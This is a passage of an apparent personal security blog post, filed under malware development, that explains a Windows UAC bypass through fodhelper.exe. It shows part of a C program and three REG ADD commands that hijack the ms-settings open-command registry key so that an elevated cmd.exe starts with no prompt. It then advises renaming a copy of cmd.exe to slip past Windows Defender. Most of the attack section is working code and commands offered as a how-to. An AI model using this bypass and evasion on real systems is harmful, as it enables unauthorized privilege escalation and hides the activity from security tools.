    <span class="c1">// Set the value for the DelegateExecute key</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">RegSetValueExA</span><span class="p">(</span><span class="n">phkresult</span><span class="p">,</span> <span class="n">valueName</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"RegSetValueExA failed with error code %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">RegCloseKey</span><span class="p">(</span><span class="n">phkresult</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    
    <span class="n">RegCloseKey</span><span class="p">(</span><span class="n">phkresult</span><span class="p">);</span>

    
    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

    <span class="c1">// Create a new process to run fodhelper.exe</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"powershell.exe -c fodhelper.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NO_WINDOW</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"CreateProcessA failed with error code %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

   
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>

</pre></td></tr></tbody></table></code></div></div>

<p>If the code looks a bit boring, a simple 3-step PowerShell script can do the same thing.</p>

<h3 id="using-powerhsell"><span class="me-2">Using Powerhsell</span><a href="#using-powerhsell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>As <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> checks the <code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\ms-settings\Shell\Open\Command</code> key in the registry, the PowerShell <code class="language-plaintext highlighter-rouge">REG</code> utility can be used to add this registry key.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PS C:\Users\ACER&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
The operation completed successfully.
PS C:\Users\ACER&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Since <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> looks for the default value data to be an executable file, setting it to <code class="language-plaintext highlighter-rouge">cmd.exe</code> will work.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PS C:\Users\ACER&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
The operation completed successfully.
PS C:\Users\ACER&gt;
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">fodhelper.exe</code> also checks for the <code class="language-plaintext highlighter-rouge">DelegateExecute</code> value in the same registry key. This value can be added with empty data using the following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PS C:\Users\ACER&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
The operation completed successfully.
PS C:\Users\ACER&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>After successfully adding all the necessary registry keys, values, and data, executing <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> will bypass UAC. Since <code class="language-plaintext highlighter-rouge">cmd.exe</code> has been set, a Command Prompt with elevated privileges should appear.</p>

<p><a href="/assets/img/UAC_bypass_using_fodhelper/Executing_fodhelper.png" class="popup img-link  shimmer"><img src="/assets/img/UAC_bypass_using_fodhelper/Executing_fodhelper.png" alt="fodhelper.exe" loading="lazy"></a></p>

<p><a href="/assets/img/UAC_bypass_using_fodhelper/elevated_yes.png" class="popup img-link  shimmer"><img src="/assets/img/UAC_bypass_using_fodhelper/elevated_yes.png" alt="elevated" loading="lazy"></a></p>

<h2 id="whats-stopping-the-attack"><span class="me-2">What’s Stopping the Attack?</span><a href="#whats-stopping-the-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Windows Defender: Is It Enough?</p>

<p>if the above steps were simply followed then you might find that <code class="language-plaintext highlighter-rouge">Windows Defender</code> isn’t quite celebrating the fact that a <code class="language-plaintext highlighter-rouge">cmd.exe</code> has been launched with elevated privileges especially without triggering a UAC prompt.</p>

<p><a href="/assets/img/UAC_bypass_using_fodhelper/Defender_threat_block.png" class="popup img-link  shimmer"><img src="/assets/img/UAC_bypass_using_fodhelper/Defender_threat_block.png" alt="Defender_trigger" loading="lazy"></a></p>

<p>To keep things under the radar, just make a copy of <code class="language-plaintext highlighter-rouge">cmd.exe</code> from <code class="language-plaintext highlighter-rouge">C:\Windows\System32</code> and give it a new name something less obvious. This simple trick can help avoid detection.</p>

<p>
  <video class="embed-video file" controls="" autoplay="" loop="" muted="">
    
    

    
    
    

    

    
      
      
      
      <source src="/./assets/img/UAC_bypass_using_fodhelper/bypass.mp4" type="video/mp4" />
    

    Your browser does not support the video tag. Here is a
    <a href="/./assets/img/UAC_bypass_using_fodhelper/bypass.mp4">link to the video file</a> instead.
  </video>
  
    <em>Defender bypass</em>
  
</p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/malware-development/">Malware Development</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/uac-bypass/"
            class="post-tag no-text-decoration"
          >UAC Bypass</a>
        
          <a
            href="/tags/malware-development/"
            class="post-tag no-text-decoration"
          >Malware Development</a>
        
          <a
            href="/tags/windows-internals/"
            class="post-tag no-text-decoration"
          >Windows Internals</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=UAC%20bypass%20using%20fodhelper%20-%20Utsab%20Adhikari&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUAC_bypass_using_fodhelper%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=UAC%20bypass%20using%20fodhelper%20-%20Utsab%20Adhikari&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUAC_bypass_using_fodhelper%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FUAC_bypass_using_fodhelper%2F&text=UAC%20bypass%20using%20fodhelper%20-%20Utsab%20Adhikari" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Analaysis_of_Macro-Embeeded-Excel-File/">Analysis of Macro-Embedded Excel File</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/UAC_bypass_using_fodhelper/">UAC bypass using fodhelper</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/command-line-spoofing/">Command Line Spoofing</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Windows_core_processes/">Windows Core Processes</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/local_function_stomping_injection/">Local Function Stomping Injection</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/malware-development/">Malware Development</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/windows-internals/">Windows Internals</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/malware-analysis/">Malware Analysis</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/uac-bypass/">UAC Bypass</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="d-none ps-0 pe-4">
    <h2 class="panel-heading ps-3 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Windows_core_processes/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1723196940"
  data-df="ll"
  
>
  Aug  9, 2024
</time>

              <h4 class="pt-0 my-2">Windows Core Processes</h4>
              <div class="text-muted">
                <p>Windows core processes are fundamental components of the operating system that manage various essential functions to keep computer running smoothly. These processes handle everything from starting ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/command-line-spoofing/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1722332940"
  data-df="ll"
  
>
  Jul 30, 2024
</time>

              <h4 class="pt-0 my-2">Command Line Spoofing</h4>
              <div class="text-muted">
                <p>Command line spoofing is a technique where the instructions given to a program through the command line are altered or replaced. To make this clearer, let’s break it down:

When a program runs, it ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/local_function_stomping_injection/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1722260820"
  data-df="ll"
  
>
  Jul 29, 2024
</time>

              <h4 class="pt-0 my-2">Local Function Stomping Injection</h4>
              <div class="text-muted">
                <p>Function Stomping

Function stomping typically refers to overwriting the code or data of a function with different content in its memory space. This can be done to modify the behavior of the functi...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Windows_core_processes/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Windows Core Processes</p>
    </a>
  

  
    <a
      href="/posts/Analaysis_of_Macro-Embeeded-Excel-File/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Analysis of Macro-Embedded Excel File</p>
    </a>
  
</nav>

            
              
              <!-- The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2024</time>

    
      <a href="https://twitter.com/username">Utsab Adhikari</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.0.1"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/malware-development/">Malware Development</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/windows-internals/">Windows Internals</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/malware-analysis/">Malware Analysis</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/uac-bypass/">UAC Bypass</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->
    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js"></script>






<script src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  







    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

